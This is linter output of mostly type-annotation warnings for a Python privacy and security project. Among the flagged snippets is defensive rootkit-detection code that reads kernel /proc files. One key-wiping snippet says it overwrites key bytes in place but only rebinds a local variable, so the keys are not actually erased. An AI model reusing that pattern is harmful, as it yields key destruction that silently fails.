help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\onion_router.py:107:41
    |
105 |         return encrypted_request
106 |
107 |     def get_circuits(self) -> List[List[Dict[str, Any]]]:
    |                                         ^^^^
108 |         """Get active circuits"""
109 |         return self._circuits.copy()
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:5:1
  |
3 | import logging
4 | from datetime import datetime
5 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:5:1
  |
3 | import logging
4 | from datetime import datetime
5 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         self.enabled = config.get("session_auditing", True)
16 |         self.leak_auditing = config.get("leak_auditing", True)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:20:26
   |
18 |         self._active = False
19 |
20 |         self._audit_log: List[Dict[str, Any]] = []
   |                          ^^^^
21 |         self._privacy_violations: List[Dict[str, Any]] = []
22 |         self._leak_tests = []
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:20:31
   |
18 |         self._active = False
19 |
20 |         self._audit_log: List[Dict[str, Any]] = []
   |                               ^^^^
21 |         self._privacy_violations: List[Dict[str, Any]] = []
22 |         self._leak_tests = []
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:21:35
   |
20 |         self._audit_log: List[Dict[str, Any]] = []
21 |         self._privacy_violations: List[Dict[str, Any]] = []
   |                                   ^^^^
22 |         self._leak_tests = []
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:21:40
   |
20 |         self._audit_log: List[Dict[str, Any]] = []
21 |         self._privacy_violations: List[Dict[str, Any]] = []
   |                                        ^^^^
22 |         self._leak_tests = []
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:39:51
   |
37 |         self.log_event("audit_started", {"timestamp": datetime.now().isoformat()})
38 |
39 |     def log_event(self, event_type: str, details: Dict[str, Any]):
   |                                                   ^^^^
40 |         """Log privacy event"""
41 |         if not self._active:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:57:63
   |
55 |             self.logger.warning(f"Privacy violation detected: {event_type}")
56 |
57 |     def _is_privacy_violation(self, event_type: str, details: Dict[str, Any]) -> bool:
   |                                                               ^^^^
58 |         """Check if event is a privacy violation"""
59 |         violation_types = [
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:112:33
    |
110 |         return True
111 |
112 |     def run_full_audit(self) -> Dict[str, Any]:
    |                                 ^^^^
113 |         """
114 |         Run comprehensive privacy audit.
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:130:32
    |
128 |         return results
129 |
130 |     def get_audit_log(self) -> List[Dict[str, Any]]:
    |                                ^^^^
131 |         """Get full audit log"""
132 |         return self._audit_log.copy()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:130:37
    |
128 |         return results
129 |
130 |     def get_audit_log(self) -> List[Dict[str, Any]]:
    |                                     ^^^^
131 |         """Get full audit log"""
132 |         return self._audit_log.copy()
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:134:33
    |
132 |         return self._audit_log.copy()
133 |
134 |     def get_violations(self) -> List[Dict[str, Any]]:
    |                                 ^^^^
135 |         """Get privacy violations"""
136 |         return self._privacy_violations.copy()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\privacy\privacy_auditor.py:134:38
    |
132 |         return self._audit_log.copy()
133 |
134 |     def get_violations(self) -> List[Dict[str, Any]]:
    |                                      ^^^^
135 |         """Get privacy violations"""
136 |         return self._privacy_violations.copy()
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:24:32
   |
22 |     """
23 |
24 |     def __init__(self, config: Dict[str, Any], god_tier_encryption):
   |                                ^^^^
25 |         self.config = config
26 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:37:25
   |
36 |         # Active sessions (encrypted)
37 |         self._sessions: Dict[str, Dict[str, Any]] = {}
   |                         ^^^^
38 |
39 |         self._active = False
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:37:35
   |
36 |         # Active sessions (encrypted)
37 |         self._sessions: Dict[str, Dict[str, Any]] = {}
   |                                   ^^^^
38 |
39 |         self._active = False
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:61:49
   |
59 |         self._active = False
60 |
61 |     def create_session(self, client_id: str) -> Dict[str, Any]:
   |                                                 ^^^^
62 |         """
63 |         Create new remote browser session.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:104:62
    |
102 |         }
103 |
104 |     def send_command(self, session_id: str, command: str) -> Dict[str, Any]:
    |                                                              ^^^^
105 |         """
106 |         Send command to remote browser (encrypted).
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:136:31
    |
134 |             self.logger.info(f"Remote browser session disconnected: {session_id}")
135 |
136 |     def get_sessions(self) -> Dict[str, Dict[str, Any]]:
    |                               ^^^^
137 |         """Get all active sessions"""
138 |         return self._sessions.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:136:41
    |
134 |             self.logger.info(f"Remote browser session disconnected: {session_id}")
135 |
136 |     def get_sessions(self) -> Dict[str, Dict[str, Any]]:
    |                                         ^^^^
137 |         """Get all active sessions"""
138 |         return self._sessions.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_browser.py:140:29
    |
138 |         return self._sessions.copy()
139 |
140 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
141 |         """Get remote browser status"""
142 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_desktop.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from cryptography.fernet import Fernet
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_desktop.py:26:32
   |
24 |     """
25 |
26 |     def __init__(self, config: Dict[str, Any], god_tier_encryption):
   |                                ^^^^
27 |         self.config = config
28 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_desktop.py:42:28
   |
41 |         # Active connections (encrypted)
42 |         self._connections: Dict[str, Dict[str, Any]] = {}
   |                            ^^^^
43 |
44 |         self._active = False
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_desktop.py:42:38
   |
41 |         # Active connections (encrypted)
42 |         self._connections: Dict[str, Dict[str, Any]] = {}
   |                                      ^^^^
43 |
44 |         self._active = False
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_desktop.py:63:59
   |
61 |         self._active = False
62 |
63 |     def connect(self, client_id: str, auth_token: str) -> Dict[str, Any]:
   |                                                           ^^^^
64 |         """Connect remote desktop client with encrypted credentials"""
65 |         if not self._active:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\remote_desktop.py:99:29
    |
 97 |             self.logger.info(f"Connection closed: {conn_id}")
 98 |
 99 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
100 |         """Get remote desktop status"""
101 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\secure_tunnel.py:6:1
  |
5 | import logging
6 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\secure_tunnel.py:22:28
   |
20 |         self._tunnel_active = False
21 |
22 |     def establish(self) -> Dict[str, Any]:
   |                            ^^^^
23 |         """Establish secure tunnel"""
24 |         self.logger.info("Establishing secure tunnel with God tier encryption")
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\remote_access\secure_tunnel.py:39:29
   |
37 |         self._tunnel_active = False
38 |
39 |     def get_status(self) -> Dict[str, Any]:
   |                             ^^^^
40 |         """Get tunnel status"""
41 |         return {"active": self._tunnel_active, "god_tier_encrypted": True}
   |
help: Replace with `dict`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:19:1
   |
17 | from dataclasses import dataclass, field
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | # Cryptography imports removed - not used in current implementation
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:19:1
   |
17 | from dataclasses import dataclass, field
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | # Cryptography imports removed - not used in current implementation
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:19:1
   |
17 | from dataclasses import dataclass, field
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | # Cryptography imports removed - not used in current implementation
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:19:1
   |
17 | from dataclasses import dataclass, field
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | # Cryptography imports removed - not used in current implementation
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:19:1
   |
17 | from dataclasses import dataclass, field
18 | from enum import Enum
19 | from typing import Any, Callable, Dict, List, Optional, Set, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 |
21 | # Cryptography imports removed - not used in current implementation
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:82:17
   |
80 |     compromise_type: CompromiseType
81 |     description: str
82 |     indicators: List[str] = field(default_factory=list)
   |                 ^^^^
83 |     affected_components: List[str] = field(default_factory=list)
84 |     recommended_actions: List[ResponseAction] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:83:26
   |
81 |     description: str
82 |     indicators: List[str] = field(default_factory=list)
83 |     affected_components: List[str] = field(default_factory=list)
   |                          ^^^^
84 |     recommended_actions: List[ResponseAction] = field(default_factory=list)
85 |     evidence: Dict[str, Any] = field(default_factory=dict)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:84:26
   |
82 |     indicators: List[str] = field(default_factory=list)
83 |     affected_components: List[str] = field(default_factory=list)
84 |     recommended_actions: List[ResponseAction] = field(default_factory=list)
   |                          ^^^^
85 |     evidence: Dict[str, Any] = field(default_factory=dict)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:85:15
   |
83 |     affected_components: List[str] = field(default_factory=list)
84 |     recommended_actions: List[ResponseAction] = field(default_factory=list)
85 |     evidence: Dict[str, Any] = field(default_factory=dict)
   |               ^^^^
86 |
87 |     def to_dict(self) -> Dict[str, Any]:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:87:26
   |
85 |     evidence: Dict[str, Any] = field(default_factory=dict)
86 |
87 |     def to_dict(self) -> Dict[str, Any]:
   |                          ^^^^
88 |         """Convert to dictionary"""
89 |         return {
   |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:106:21
    |
105 |     timestamp: float
106 |     kernel_modules: Set[str]
    |                     ^^^
107 |     syscall_table_hash: Optional[bytes]
108 |     memory_regions: List[Tuple[int, int]]
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:107:25
    |
105 |     timestamp: float
106 |     kernel_modules: Set[str]
107 |     syscall_table_hash: Optional[bytes]
    |                         ^^^^^^^^^^^^^^^
108 |     memory_regions: List[Tuple[int, int]]
109 |     process_list: Set[int]
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:108:21
    |
106 |     kernel_modules: Set[str]
107 |     syscall_table_hash: Optional[bytes]
108 |     memory_regions: List[Tuple[int, int]]
    |                     ^^^^
109 |     process_list: Set[int]
110 |     network_connections: List[Tuple[str, int]]
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:108:26
    |
106 |     kernel_modules: Set[str]
107 |     syscall_table_hash: Optional[bytes]
108 |     memory_regions: List[Tuple[int, int]]
    |                          ^^^^^
109 |     process_list: Set[int]
110 |     network_connections: List[Tuple[str, int]]
    |
help: Replace with `tuple`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:109:19
    |
107 |     syscall_table_hash: Optional[bytes]
108 |     memory_regions: List[Tuple[int, int]]
109 |     process_list: Set[int]
    |                   ^^^
110 |     network_connections: List[Tuple[str, int]]
111 |     loaded_libraries: Set[str]
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:110:26
    |
108 |     memory_regions: List[Tuple[int, int]]
109 |     process_list: Set[int]
110 |     network_connections: List[Tuple[str, int]]
    |                          ^^^^
111 |     loaded_libraries: Set[str]
112 |     pcr_values: Dict[int, bytes]
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:110:31
    |
108 |     memory_regions: List[Tuple[int, int]]
109 |     process_list: Set[int]
110 |     network_connections: List[Tuple[str, int]]
    |                               ^^^^^
111 |     loaded_libraries: Set[str]
112 |     pcr_values: Dict[int, bytes]
    |
help: Replace with `tuple`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:111:23
    |
109 |     process_list: Set[int]
110 |     network_connections: List[Tuple[str, int]]
111 |     loaded_libraries: Set[str]
    |                       ^^^
112 |     pcr_values: Dict[int, bytes]
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:112:17
    |
110 |     network_connections: List[Tuple[str, int]]
111 |     loaded_libraries: Set[str]
112 |     pcr_values: Dict[int, bytes]
    |                 ^^^^
113 |
114 |     def __hash__(self):
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:128:33
    |
126 |         self._is_linux = platform.system() == "Linux"
127 |         self._is_windows = platform.system() == "Windows"
128 |         self._baseline_modules: Set[str] = set()
    |                                 ^^^
129 |         self._baseline_syscalls: Optional[bytes] = None
    |
help: Replace with `set`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:129:34
    |
127 |         self._is_windows = platform.system() == "Windows"
128 |         self._baseline_modules: Set[str] = set()
129 |         self._baseline_syscalls: Optional[bytes] = None
    |                                  ^^^^^^^^^^^^^^^
130 |
131 |     def get_loaded_kernel_modules(self) -> Set[str]:
    |
help: Convert to `X | None`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:131:44
    |
129 |         self._baseline_syscalls: Optional[bytes] = None
130 |
131 |     def get_loaded_kernel_modules(self) -> Set[str]:
    |                                            ^^^
132 |         """Get list of loaded kernel modules"""
133 |         modules = set()
    |
help: Replace with `set`

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:137:44
    |
135 |         if self._is_linux:
136 |             try:
137 |                 with open("/proc/modules", "r") as f:
    |                                            ^^^
138 |                     for line in f:
139 |                         module_name = line.split()[0]
    |
help: Remove mode argument

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:163:58
    |
161 |         return modules
162 |
163 |     def detect_suspicious_modules(self, current_modules: Set[str]) -> List[str]:
    |                                                          ^^^
164 |         """Detect suspicious kernel modules"""
165 |         suspicious = []
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:163:71
    |
161 |         return modules
162 |
163 |     def detect_suspicious_modules(self, current_modules: Set[str]) -> List[str]:
    |                                                                       ^^^^
164 |         """Detect suspicious kernel modules"""
165 |         suspicious = []
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:196:41
    |
194 |         return suspicious
195 |
196 |     def get_syscall_table_hash(self) -> Optional[bytes]:
    |                                         ^^^^^^^^^^^^^^^
197 |         """
198 |         Get hash of system call table.
    |
help: Convert to `X | None`

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:207:49
    |
206 |                 try:
207 |                     with open("/proc/kallsyms", "r") as f:
    |                                                 ^^^
208 |                         for line in f:
209 |                             if "sys_call_table" in line:
    |
help: Remove mode argument

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:243:38
    |
241 |         return False
242 |
243 |     def scan_memory_regions(self) -> List[Tuple[int, int]]:
    |                                      ^^^^
244 |         """Scan memory regions for anomalies"""
245 |         regions = []
    |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:243:43
    |
241 |         return False
242 |
243 |     def scan_memory_regions(self) -> List[Tuple[int, int]]:
    |                                           ^^^^^
244 |         """Scan memory regions for anomalies"""
245 |         regions = []
    |
help: Replace with `tuple`

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:249:56
    |
247 |         try:
248 |             if self._is_linux:
249 |                 with open(f"/proc/{os.getpid()}/maps", "r") as f:
    |                                                        ^^^
250 |                     for line in f:
251 |                         parts = line.split()
    |
help: Remove mode argument

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:262:42
    |
260 |         return regions
261 |
262 |     def detect_hidden_processes(self) -> List[int]:
    |                                          ^^^^
263 |         """Detect hidden processes (PID manipulation)"""
264 |         hidden_pids = []
    |
help: Replace with `list`

UP015 [*] Unnecessary mode argument
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:300:55
    |
298 |             if self._is_linux:
299 |                 # Check for kernel memory corruption indicators
300 |                 with open("/proc/sys/kernel/tainted", "r") as f:
    |                                                       ^^^
301 |                     tainted = int(f.read().strip())
302 |                     if tainted != 0:
    |
help: Remove mode argument

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:322:34
    |
320 |         self.logger = logging.getLogger(__name__)
321 |         self.kernel_interface = KernelInterface()
322 |         self._baseline_snapshot: Optional[SystemSnapshot] = None
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^
323 |         self._detection_history: deque = deque(maxlen=1000)
324 |         self._lock = threading.Lock()
    |
help: Convert to `X | None`

C401 Unnecessary generator (rewrite as a set comprehension)
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:364:17
    |
362 |             memory_regions=self.kernel_interface.scan_memory_regions(),
363 |             process_list=(
364 |                 set(int(pid) for pid in os.listdir("/proc") if pid.isdigit())
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
365 |                 if os.path.exists("/proc")
366 |                 else set()
    |
help: Rewrite as a set comprehension

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:373:33
    |
371 |         )
372 |
373 |     def detect_rootkit(self) -> Optional[CompromiseEvent]:
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^
374 |         """Detect rootkit presence"""
375 |         if not self.config["enable_rootkit_detection"]:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:446:38
    |
444 |         return any(suspicious_indicators)
445 |
446 |     def detect_kernel_hooks(self) -> Optional[CompromiseEvent]:
    |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^
447 |         """Detect kernel-level hooking"""
448 |         if not self.config["enable_kernel_hook_detection"]:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:479:42
    |
477 |         return None
478 |
479 |     def detect_memory_anomalies(self) -> Optional[CompromiseEvent]:
    |                                          ^^^^^^^^^^^^^^^^^^^^^^^^^
480 |         """Detect memory-level anomalies"""
481 |         if not self.config["enable_memory_scan"]:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:511:43
    |
509 |         return None
510 |
511 |     def detect_process_injection(self) -> Optional[CompromiseEvent]:
    |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^
512 |         """Detect process injection attempts"""
513 |         if not self.config["enable_process_injection_detection"]:
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:544:37
    |
542 |         return None
543 |
544 |     def comprehensive_scan(self) -> List[CompromiseEvent]:
    |                                     ^^^^
545 |         """Perform comprehensive system compromise scan"""
546 |         self.logger.info("Starting comprehensive compromise scan")
    |
help: Replace with `list`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:583:28
    |
581 |     def __init__(self):
582 |         self.logger = logging.getLogger(__name__)
583 |         self._wiped_items: Set[str] = set()
    |                            ^^^
584 |         self._lock = threading.Lock()
    |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:607:45
    |
605 |             return False
606 |
607 |     def wipe_master_keys(self, key_storage: Dict[str, Any]) -> bool:
    |                                             ^^^^
608 |         """Wipe master cryptographic keys"""
609 |         with self._lock:
    |
help: Replace with `dict`

B007 Loop control variable `i` not used within loop body
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:620:33
    |
618 |                         if isinstance(key_data, bytes):
619 |                             # Overwrite in place
620 |                             for i in range(len(key_data)):
    |                                 ^
621 |                                 key_data = b"\x00" * len(key_data)
622 |                             for i in range(len(key_data)):
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:622:33
    |
620 | ΓÇª                     for i in range(len(key_data)):
621 | ΓÇª                         key_data = b"\x00" * len(key_data)
622 | ΓÇª                     for i in range(len(key_data)):
    |                           ^
623 | ΓÇª                         key_data = secrets.token_bytes(len(key_data))
624 | ΓÇª                     for i in range(len(key_data)):
    |
help: Rename unused `i` to `_i`

B007 Loop control variable `i` not used within loop body
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:624:33
    |
622 | ΓÇª                     for i in range(len(key_data)):
623 | ΓÇª                         key_data = secrets.token_bytes(len(key_data))
624 | ΓÇª                     for i in range(len(key_data)):
    |                           ^
625 | ΓÇª                         key_data = b"\xff" * len(key_data)
    |
help: Rename unused `i` to `_i`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:639:50
    |
637 |                 return False
638 |
639 |     def wipe_session_keys(self, session_storage: Dict[str, Any]) -> bool:
    |                                                  ^^^^
640 |         """Wipe session keys and tokens"""
641 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:655:50
    |
653 |                 return False
654 |
655 |     def wipe_credentials(self, credential_store: Dict[str, Any]) -> bool:
    |                                                  ^^^^
656 |         """Wipe stored credentials"""
657 |         with self._lock:
    |
help: Replace with `dict`

UP006 [*] Use `set` instead of `Set` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:735:31
    |
733 |     def __init__(self):
734 |         self.logger = logging.getLogger(__name__)
735 |         self._destroyed_keys: Set[str] = set()
    |                               ^^^
736 |
737 |     def destroy_tpm_keys(self, tpm_interface) -> bool:
    |
help: Replace with `set`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:777:62
    |
775 |             return False
776 |
777 |     def destroy_all_hardware_keys(self, hardware_interfaces: List[Any]) -> bool:
    |                                                              ^^^^
778 |         """Destroy keys in all hardware security modules"""
779 |         self.logger.critical("Destroying all hardware-stored keys")
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\security\dos_trap.py:806:36
    |
804 |     def __init__(self):
805 |         self.logger = logging.getLogger(__name__)
806 |         self._disabled_interfaces: List[str] = []
    |                                    ^^^^
807 |         self._is_linux = platform.system() == "Linux"
